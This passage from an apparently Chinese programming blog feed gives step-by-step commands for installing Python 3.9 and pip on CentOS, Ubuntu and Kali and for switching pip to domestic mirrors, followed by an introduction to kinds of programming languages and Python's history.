class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>）前往用户根目录</span><br><span class="line">cd ~</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>）安装依赖包</span><br><span class="line">yum install gcc openssl-devel bzip2-devel libffi-devel -y</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>）下载并解压安装包</span><br><span class="line">curl -O https://www.python.org/ftp/python/<span class="number">3.9</span><span class="number">.0</span>/Python-<span class="number">3.9</span><span class="number">.0</span>.tgz</span><br><span class="line">注：不同的版本修改版本号<span class="number">3.9</span><span class="number">.0</span>即可 , 如果下载过慢 ,也可以使用镜像站</span><br><span class="line">wget http://npm.taobao.org/mirrors/python/<span class="number">3.9</span><span class="number">.0</span>/Python-<span class="number">3.9</span><span class="number">.0</span>.tgz</span><br><span class="line">    </span><br><span class="line">tar -zxvf Python-<span class="number">3.9</span><span class="number">.0</span>.tgz</span><br><span class="line"></span><br><span class="line"><span class="number">4</span>）进入目标文件</span><br><span class="line">cd Python-<span class="number">3.9</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="number">5</span>）配置安装路径：/usr/local/python3</span><br><span class="line">./configure prefix=/usr/local/python3</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>）编译并安装</span><br><span class="line">make &amp;&amp; sudo make install</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>）建立软连接：终端命令 python3，pip3</span><br><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/python3 /usr/<span class="built_in">bin</span>/python3</span><br><span class="line">ln -s /usr/local/python3/<span class="built_in">bin</span>/pip3 /usr/<span class="built_in">bin</span>/pip3</span><br><span class="line"></span><br><span class="line"><span class="number">8</span>) 验证</span><br><span class="line">python3 --version</span><br><span class="line">pip3 --version</span><br><span class="line"></span><br><span class="line"><span class="number">9</span>）删除安装包与文件：</span><br><span class="line">rm -rf Python-<span class="number">3.9</span><span class="number">.0</span></span><br><span class="line">rm -rf Python-<span class="number">3.9</span><span class="number">.0</span>.tgz</span><br></pre></td></tr></table></figure><h2 id="3-ubuntu安装python"><a href="#3-ubuntu安装python" class="headerlink" title="3.ubuntu安装python"></a>3.ubuntu安装python</h2><p>ubuntu默认是安装python2和python3的 , 但是如果你的ubuntu发行版本过低导致你需要的python3版本太低 , 可能不满足你的需求 , 那么怎么安装新版本的python3呢?或者怎么升级python3?</p><p><strong>千万不要卸载ubuntu 桌面版自带的python版本</strong>，否则会开不了机。</p><p>安装方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install software-properties-common</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、使用Apt-Get安装Python <span class="number">3.9</span></span><br><span class="line">Apt软件包管理器提供了在Ubuntu系统上安装Python <span class="number">3.9</span>的简单方法。请按照以下步骤操作：</span><br><span class="line">打开系统上的终端，然后为系统配置Deadsnakes PPA。</span><br><span class="line">sudo add-apt-repository ppa:deadsnakes/ppa</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>在Ubuntu系统上添加ppa后，更新apt缓存并在Ubuntu上安装Python <span class="number">3.9</span>。</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3<span class="number">.9</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>等待安装完成。通过执行以下命令检查Python版本：</span><br><span class="line">python3<span class="number">.9</span> -V</span><br><span class="line">至此，Python <span class="number">3.9</span>已安装在Ubuntu系统上并可以使用。</span><br><span class="line"></span><br><span class="line">修改软连接 , 不是很推荐就用python3<span class="number">.9</span>吧</span><br><span class="line">sudo rm /usr/<span class="built_in">bin</span>/python3</span><br><span class="line">sudo ln -s python3<span class="number">.7</span> python3</span><br></pre></td></tr></table></figure><p>但是默认是没有pip3指向python3.9的 , 解决办法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">安装pip3-&gt;python3<span class="number">.9</span></span><br><span class="line"><span class="comment"># 安装pip3 </span></span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py  //下载安装脚本。</span><br><span class="line">python3<span class="number">.9</span> get-pip.py  //执行安装脚本</span><br><span class="line">如果报错 ,  ModuleNotFoundError: No module named <span class="string">&#x27;distutils.cmd&#x27;</span></span><br><span class="line">sudo apt-get install python3-distutils</span><br><span class="line">sudo cp -r /usr/lib/python3<span class="number">.6</span>/distutils /usr/lib/python3<span class="number">.9</span>/</span><br><span class="line">然后再执行</span><br><span class="line">python3<span class="number">.9</span> get-pip.py</span><br><span class="line"></span><br><span class="line">pip3<span class="number">.9</span> -V  //查看当前pip3的版本</span><br><span class="line"></span><br><span class="line">ubuntu  python版本推荐方案 : 安装python3<span class="number">.9</span> , 然后安装pip3-&gt;python3<span class="number">.9</span></span><br></pre></td></tr></table></figure><p>补充 :</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">kali虽然默认已经安装了python2和最先版本的python3 , 但是没有区分pip2和pip3</span><br><span class="line"></span><br><span class="line">解决方法</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装pip2</span></span><br><span class="line">wget https://bootstrap.pypa.io/pip/2.7/get-pip.py   //下载安装脚本。基于当前python2的具体版本</span><br><span class="line">python2 get-pip.py            // 执行脚本</span><br><span class="line">pip2 -V                              //查看当前pip2的版本</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装pip3 ( 两个不要在一个目录下 )</span></span><br><span class="line">wget https://bootstrap.pypa.io/get-pip.py  //下载安装脚本。</span><br><span class="line">python3 get-pip.py  //执行安装脚本</span><br><span class="line">pip3 -V  //查看当前pip3的版本</span><br></pre></td></tr></table></figure><h2 id="4-pip换源"><a href="#4-pip换源" class="headerlink" title="4.pip换源"></a>4.pip换源</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pip  pip.exe  python的包管理工具 , 通过它可以下载安装一下第三方库</span><br><span class="line">pip3 install xxx</span><br><span class="line">npm</span><br><span class="line">apt</span><br><span class="line">yum</span><br><span class="line">brew</span><br></pre></td></tr></table></figure><h3 id="4-1windows-pip换源"><a href="#4-1windows-pip换源" class="headerlink" title="4.1windows pip换源"></a>4.1windows pip换源</h3><p>1.在运行窗口( <code>win + R</code> )中输入**%APPDATA%**</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023175122121.png" alt="image-20211023175122121"></p><p>2.进入目录后，新建一个文件夹<strong>pip</strong>，并在该文件夹里面新建文件<strong>pip.ini</strong>，并输入以下内容：</p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023175153352.png" alt="image-20211023175153352"></p><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20211023175229500.png" alt="image-20211023175229500"></p><p><strong>pip.ini文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout=6000</span><br><span class="line">index-url=https://pypi.tuna.tsinghua.edu.cn/simple/</span><br></pre></td></tr></table></figure><p>或者豆瓣源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout=6000</span><br><span class="line">index-url=http://pypi.douban.com/simple</span><br><span class="line">trusted-host=pypi.douban.com</span><br></pre></td></tr></table></figure><h3 id="4-2-linux-pip换源"><a href="#4-2-linux-pip换源" class="headerlink" title="4.2 linux pip换源"></a>4.2 linux pip换源</h3><p>无论是那种linux发行版本 , 换源的方法都一样</p><p>配置pip源，提高下载速度</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir ~/.pip &amp;&amp; touch ~/.pip/pip.conf</span><br><span class="line">vim ~/.pip/pip.conf</span><br></pre></td></tr></table></figure><p>内容如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">timeout=6000</span><br><span class="line">index-url=http://pypi.douban.com/simple</span><br><span class="line">trusted-host=pypi.douban.com</span><br></pre></td></tr></table></figure><p>linux系统可能需要重启生效</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python介绍</title>
      <link href="/2023/04/02/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%92%8Cpython%E4%BB%8B%E7%BB%8D/"/>
      <url>/2023/04/02/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80%E5%92%8Cpython%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="1-编程语言的分类"><a href="#1-编程语言的分类" class="headerlink" title="1. 编程语言的分类"></a>1. 编程语言的分类</h2><h3 id="1-1-机器语言"><a href="#1-1-机器语言" class="headerlink" title="1.1 机器语言"></a>1.1 机器语言</h3><p>机器语言是站在 计算机 (奴隶)的角度，说计算机能听懂&#x2F;理解的语言，而计算机能直接理解的就是二进制指令，所</p><p>以机器语言就是直接用二进制编程，这意味着机器语言是直接操作硬件的，因此机器语言属于低级语言，此处的低</p><p>级指的是底层、贴近计算机硬件（贴近是指需要详细了解计算机硬件细节、直接控制硬件），详解如下 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#机器语言</span></span><br><span class="line">    用二进制代码<span class="number">0</span>和<span class="number">1</span>描述的指令称为机器指令，由于计算机内部是基于二进制指令工作的，所以机器语言是直接控制计算机硬件。</span><br><span class="line"></span><br><span class="line">    用机器语言编写程序，编程人员要首先熟记所用计算机的全部指令代码以及代码的含义，然后在编写程序时，程序员得自己处理每条指令和每一数据的存储分配和输入输出，还得记住编程过程中每步所使用的工作单元处在何种状态。这是一件十分繁琐的工作。编写程序花费的时间往往是实际运行时间的几十倍或几百倍。而且，编出的程序全是些<span class="number">0</span>和<span class="number">1</span>的指令代码，直观性差，不便阅读和书写，还容易出错，且依赖于具体的计算机硬件型号，局限性很大。除了计算机生产厂家的专业人员外，绝大多数的程序员已经不再去学习机器语言了。</span><br><span class="line"></span><br><span class="line">    机器语言是被微处理器理解和使用的，存在有多至<span class="number">100000</span>种机器语言的指令，下述是一些简单示例</span><br><span class="line"></span><br><span class="line">    <span class="comment">#指令部份的示例</span></span><br><span class="line">    <span class="number">0000</span> 代表 加载（LOAD）</span><br><span class="line">    0001 代表 存储（STORE）</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">#暂存器部份的示例</span></span><br><span class="line">    <span class="number">0000</span> 代表暂存器 A</span><br><span class="line">    0001 代表暂存器 B</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment">#存储器部份的示例</span></span><br><span class="line">    <span class="number">000000000000</span> 代表地址为 <span class="number">0</span> 的存储器</span><br><span class="line">    000000000001 代表地址为 <span class="number">1</span> 的存储器</span><br><span class="line">    <span class="number">0000000</span>10000 代表地址为 <span class="number">16</span> 的存储器</span><br><span class="line">    <span class="number">100000000000</span> 代表地址为 <span class="number">2</span>^<span class="number">11</span> 的存储器</span><br><span class="line"></span><br><span class="line">    <span class="comment">#集成示例</span></span><br><span class="line">    <span class="number">0000</span>,<span class="number">0000</span>,<span class="number">0000000</span>10000 代表 LOAD A, <span class="number">16</span></span><br><span class="line">    <span class="number">0000</span>,0001,000000000001 代表 LOAD B, <span class="number">1</span></span><br><span class="line">    0001,0001,<span class="number">0000000</span>10000 代表 STORE B, <span class="number">16</span></span><br><span class="line">    0001,0001,000000000001 代表 STORE B, <span class="number">1</span>[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><p><strong>机器语言的特点 :</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、执行效率最高</span></span><br><span class="line">编写的程序可以被计算机无障碍理解、直接运行，执行效率高 。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、开发效率最低</span></span><br><span class="line">复杂，开发效率低</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、跨平台性差</span></span><br><span class="line">贴近/依赖具体的硬件，跨平台性差,他是直接控制cpu执行，</span><br><span class="line">那么不同平台上的计算机硬件中的cpu型号可能不同</span><br></pre></td></tr></table></figure><h3 id="1-2-汇编语言"><a href="#1-2-汇编语言" class="headerlink" title="1.2 汇编语言"></a>1.2 汇编语言</h3><p>汇编语言仅仅是用一个英文标签代表一组二进制指令( 之间是映射关系)，毫无疑问，比起机器语言，汇编语言是</p><p>一种进步，但汇编语言的本质仍然是直接操作硬件，因此汇编语言仍是比较低级&#x2F;底层的语言、贴近计算机硬件 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#汇编语言</span></span><br><span class="line">汇编语言的实质和机器语言是相同的，都是直接对硬件操作，只不过指令采用了英文缩写的标识符，更容易识别和记忆。它同样需要编程者将每一步具体的操作用命令的形式写出来。汇编程序的每一句指令只能对应实际操作过程中的一个很细微的动作。例如移动、自增，因此汇编源程序一般比较冗长、复杂、容易出错，而且使用汇编语言编程需要有更多的计算机专业知识，但汇编语言的优点也是显而易见的，用汇编语言所能完成的操作不是一般高级语言所能够实现的，而且源程序经汇编生成的可执行文件不仅比较小，而且执行速度很快。</span><br><span class="line"></span><br><span class="line">汇编的hello world，打印一句hello world, 需要写十多行，如下</span><br><span class="line"></span><br><span class="line">; hello.asm </span><br><span class="line">section.data            ; 数据段声明</span><br><span class="line">        msg db <span class="string">&quot;Hello, world!&quot;</span>, <span class="number">0xA</span>     ; 要输出的字符串</span><br><span class="line">        <span class="built_in">len</span> equ $ - msg                 ; 字串长度</span><br><span class="line">        section .text            ; 代码段声明</span><br><span class="line">        <span class="keyword">global</span> _start            ; 指定入口函数</span><br><span class="line">        _start:                  ; 在屏幕上显示一个字符串</span><br><span class="line">        mov edx, <span class="built_in">len</span>     ; 参数三：字符串长度</span><br><span class="line">        mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class="line">        mov ebx, <span class="number">1</span>       ; 参数一：文件描述符(stdout) </span><br><span class="line">        mov eax, <span class="number">4</span>       ; 系统调用号(sys_write) </span><br><span class="line">        <span class="built_in">int</span> <span class="number">0x80</span>         ; 调用内核功能</span><br><span class="line">                               ; 退出程序</span><br><span class="line">        mov ebx, <span class="number">0</span>       ; 参数一：退出代码</span><br><span class="line">        mov eax, <span class="number">1</span>       ; 系统调用号(sys_exit) </span><br><span class="line">        <span class="built_in">int</span> <span class="number">0x80</span>         ; 调用内核功能</span><br></pre></td></tr></table></figure><p><strong>汇编语言的特点</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、执行效率高</span></span><br><span class="line">相对于机器语言，使用英文标签编写程序相对简单，执行效率高，</span><br><span class="line">但较之机器语言稍低，</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、开发效率低：</span></span><br><span class="line">仍然是直接操作硬件，比起机器语言来说，复杂度稍低，</span><br><span class="line">但依旧居高不下，所以开发效率依旧较低</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、跨平台性差</span></span><br><span class="line">同样依赖具体的硬件，跨平台性差</span><br></pre></td></tr></table></figure><h3 id="1-3-高级语言"><a href="#1-3-高级语言" class="headerlink" title="1.3 高级语言"></a>1.3 高级语言</h3><h4 id="1-3-1-编译型语言"><a href="#1-3-1-编译型语言" class="headerlink" title="1.3.1 编译型语言"></a>1.3.1 编译型语言</h4><p>编译型语言是指程序在执行之前需要一个专门的编译过程，把程序源文件编译为机器语言的文件，运行时不需要重</p><p>新编译，执行效率高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、执行效率高</span></span><br><span class="line">编译是指在应用源程序执行之前，就将程序源代码“翻译”成目标代码（即机器语言），</span><br><span class="line">因此其目标程序可以脱离其语言环境独立执行，使用比较方便，执行效率较高。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、开发效率低：</span></span><br><span class="line">应用程序一旦需要修改，必须先修改源代码，然后重新编译、生成新的目标文件才能执行，</span><br><span class="line">而在只有目标文件而没有源代码，修改会很不方便。所以开发效率低于解释型</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、跨平台性差</span></span><br><span class="line">编译型代码是针对某一个平台翻译的，当前平台翻译的结果无法拿到不同的平台使用，</span><br><span class="line">针对不同的平台必须重新编译，即跨平台性差</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他</span></span><br><span class="line">现在大多数的编程语言都是编译型的。</span><br><span class="line">编译程序将源程序翻译成目标程序后保存在另一个文件中，</span><br><span class="line">该目标程序可脱离编译程序直接在计算机上多次运行。</span><br><span class="line">大多数软件产品都是以目标程序形式发行给用户的，</span><br><span class="line">不仅便于直接运行，同时又使他人难于盗用其中的技术。</span><br><span class="line">C、C++、Ada、Pascal都是编译实现的</span><br></pre></td></tr></table></figure><h4 id="1-3-2-解释型语言"><a href="#1-3-2-解释型语言" class="headerlink" title="1.3.2 解释型语言"></a>1.3.2 解释型语言</h4><p>解释型语言不能直接翻译成机器语言，而是先翻译成中间代码 （只与解释器有关，和平台无关），再由解释器对</p><p>中间代码进行解释运行 ，而且代码的每次运行，都要有解释器的参与，而且是逐行解释，相对于编译性语言执行</p><p>效率偏慢。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1、执行效率低</span></span><br><span class="line">解释型语言的实现中，解释器并不产生目标机器代码，而是产生易于执行的中间代码。</span><br><span class="line">这种中间代码与机器代码是不同的，中间代码的解释是由软件支持的，不能直接使用硬件，</span><br><span class="line">软件解释器通常会导致执行效率较低。</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2、开发效率高</span></span><br><span class="line">用解释型语言编写的程序是由另一个可以理解中间代码的解释程序执行的，与编译程序不同的是，</span><br><span class="line">解释程序的任务是逐一将源程序的语句解释成可执行的机器指令，不需要将源程序翻译成目标代码再执行。</span><br><span class="line">解释程序的优点是当语句出现语法错误时，可以立即引起程序员的注意，而程序员在程序开发期间就能进行校正。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3、跨平台性强</span></span><br><span class="line">代码运行是依赖于解释器，不同平台有对应版本的解释器，所以解释型的跨平台性强</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他</span></span><br><span class="line">例如：Tcl、Perl , VBScript、Ruby , JavaScript，php, python 等</span><br></pre></td></tr></table></figure><p>总结：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#1、执行效率：机器语言&gt;汇编语言&gt;高级语言（编译型&gt;解释型）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2、开发效率：机器语言&lt;汇编语言&lt;高级语言（编译型&lt;解释型）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3、跨平台性：解释型具有极强的跨平台型   </span></span><br></pre></td></tr></table></figure><p><strong>关于java</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">有人说Java是编译型的。因为所有的Java代码都是要编译的，.java不经过编译就无法执行。 也有人说Java是解释型的。因为java代码编译后不能直接运行，它是解释运行在JVM上的，所以它是解释型的。</span><br><span class="line"></span><br><span class="line">对于C和C++，它们经过一次编译之后，可以由操作系统直接执行，所以它们是编译型语言。而Java不一样，它首先由编译器编译成.class（字节码）文件，然后在通过JVM从.class文件中读一行解释执行一行，所以它是解释型的语言。也正是由于java对于多种不同的操作系统有不同的JVM，所以实现了真正意义上的跨平台。</span><br><span class="line"></span><br><span class="line">所以Java的执行经历了编译和解释的过程，是一种先编译，后解释执行的语言，不可以单纯归到编译性或者解释性语言的类别中。</span><br></pre></td></tr></table></figure><h2 id="2-python语言"><a href="#2-python语言" class="headerlink" title="2. python语言"></a>2. python语言</h2><p>先看一下现在python语言的流行程度，排名还是不错的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.tiobe.com/tiobe-index/</span><br></pre></td></tr></table></figure><p><img src="https://picgo-1301783483.cos.ap-nanjing.myqcloud.com/image/image-20220411154422191.png" alt="image-20220411154422191"></p><p>谈及python，涉及两层意思，一层代表的是<strong>python这门语言的语法风格</strong>，另外一层代表的则是专门用来解释该语法风格的应用程序：<strong>python解释器。</strong> </p><p>python的创始人为<code>吉多·范罗苏姆（Guido van Rossum</code>）。( 龟叔 ) Python这个名字，来自Guido所挚爱的电视剧</p><p>Monty  Python’s Flying Circus，他希望这个新的叫做Python的语言，能符合他的理想：创造一种C和shell之</p><p>间，语法够像shell一样简洁，易学易用、可拓展性强，同时兼顾C的强大功能。于是Guido在1989年的<strong>圣诞节</strong>期</p><p>间，开始写能够解释Python语言语法的解释器，最终用了一两周用c语言编写出了python解释器，即cpython。</p><p>也就是你在官网下载的就是这个解释器。</p><h3 id="2-1-python发展史"><a href="#2-1-python发展史" class="headerlink" title="2.1 python发展史"></a>2.1 python发展史</h3><p>1989年，Guido (龟叔) 开始写Python语言的编译器。 1991年，第一个Python编译器诞生。它是用C语言实现的，并能够调用C语言的库文件。从一出生，Python已经具有了：类，函数，异常处理，包含表和词典在内的核心数据类型，以及模块为基础的拓展系统。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Granddaddy of Python web frameworks, Zope 1 was released in 1999</span><br><span class="line"></span><br><span class="line">Python 1.0 - January 1994 增加了 lambda, map, filter and reduce.</span><br><span class="line"></span><br><span class="line">Python 2.0 - October 16, 2000，加入了内存回收机制，构成了现在Python语言框架的基础</span><br><span class="line"></span><br><span class="line">Python 2.4 - November 30, 2004, 同年目前最流行的WEB框架Django 诞生</span><br><span class="line"></span><br><span class="line">Python 2.5 - September 19, 2006</span><br><span class="line"></span><br><span class="line">Python 2.6 - October 1, 2008</span><br><span class="line"></span><br><span class="line">Python 2.7 - July 3, 2010</span><br><span class="line"></span><br><span class="line">In November 2014, it was announced that Python 2.7 would be supported until 2020, and reaffirmed that there would be no 2.8 release as users were expected to move to Python 3.4+ as soon as possible</span><br></pre></td></tr></table></figure><p>Python 3.0 - December 3, 2008 (细心的读者会发现，08年时就推出了3.0，2010年反而又推出了2.7？是因为3.0不向下兼容2.0，而很多公司已经基于2.0版本开发出了大量程序，公司已然投入了大量的人财物力，这就导致大家都拒绝升级3.0，无奈官方只能推出2.7过渡版本，之后我们都应该采用3.0解释器开发程序，但为了方便读者维护2.0版本的软件，我们在遇到两种版本的差异时会专门指出来)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Python 3.1 - June 27, 2009</span><br><span class="line"></span><br><span class="line">Python 3.2 - February 20, 2011</span><br><span class="line"></span><br><span class="line">Python 3.3 - September 29, 2012</span><br><span class="line"></span><br><span class="line">Python 3.4 - March 16, 2014</span><br><span class="line"></span><br><span class="line">Python 3.5 - September 13, 2015</span><br><span class="line"></span><br><span class="line">Python 3.6 - 2016-12-23 发布python3.6.0版</span><br><span class="line"></span><br><span class="line">python 3.7</span><br><span class="line"></span><br><span class="line">python 3.8 </span><br><span class="line"></span><br><span class="line">python 3.9</span><br><span class="line"></span><br><span class="line">python 3.10</span><br><span class="line"></span><br><span class="line">python 3.11</span><br><span class="line"></span><br><span class="line">其中3.7是一个小的分水岭 , 更新了很多异步的一些语法</span><br></pre></td></tr></table></figure><h3 id="2-2-python解释器的种类"><a href="#2-2-python解释器的种类" class="headerlink" title="2.2 python解释器的种类"></a>2.2 python解释器的种类</h3><p>官方的Python解释器本质就是基于C语言开发的一个软件，该软件的功能就是读取以.py结尾的文件内容，然后按</p><p>照Guido定义好的语法和规则去翻译并执行相应的代码。这种用C实现的解释器称为CPython，它是python领域</p><p>性能最好，应用最广泛的一款解释器，我们在后面提到的解释器指的都是Cpython解释器。但其实解释器作为一</p><p>款应用软件，完全可以采用其他语言来开发，只要能解释python这门语言的语法即可。Python解释器的一些种类</p><p>如下，简单了解即可。</p><h4 id="2-2-1-CPython"><a href="#2-2-1-CPython" class="headerlink" title="2.2.1 CPython"></a>2.2.1 